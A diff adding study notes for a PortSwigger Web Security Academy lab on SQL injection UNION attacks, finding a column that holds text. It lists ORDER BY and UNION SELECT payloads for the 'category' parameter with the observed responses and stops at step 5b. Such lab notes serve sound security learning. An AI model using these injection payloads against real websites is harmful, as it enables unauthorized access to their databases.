@@ -165,3 +165,35 @@ Alternative:
 		Response: Returns Products
 ```
 
+
+###### Lab: SQL injection UNION attack, finding a column containing text
+URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
+Endpoint: category
+
+Steps:
+```
+1. Click on any filter item.
+2. Add ' to verify if sql injection exists.
+3. Use the Order Clause to check the number of items that are being returned.
+	3a. category=Gifts'+ORDER+BY+1--
+	Response: Returns products
+	3b. category=Gifts'+ORDER+BY+2--
+	Response: Returns products
+	3c. category=Gifts'+ORDER+BY+3--
+	Response: Returns products
+	3d. category=Gifts'+ORDER+BY+4--
+	Response: Internal server error
+Alternative:
+4. 
+	4a. category=Pets'+UNION+SELECT+NULL--+
+		Response: Error
+	4b. category=Pets'+UNION+SELECT+NULL,NULL--+
+		Response: Error
+	4c. category=Pets'+UNION+SELECT+NULL,NULL,NULL--+
+		Response: Returns Products
+5. Checking the type of each one
+	5a. category=Pets'+UNION+SELECT+'a',NULL,NULL--+
+		Response: Error
+	5b. category=Pets'+UNION+SELECT+NULL,'a',NULL--+
+		Response: Response
+```
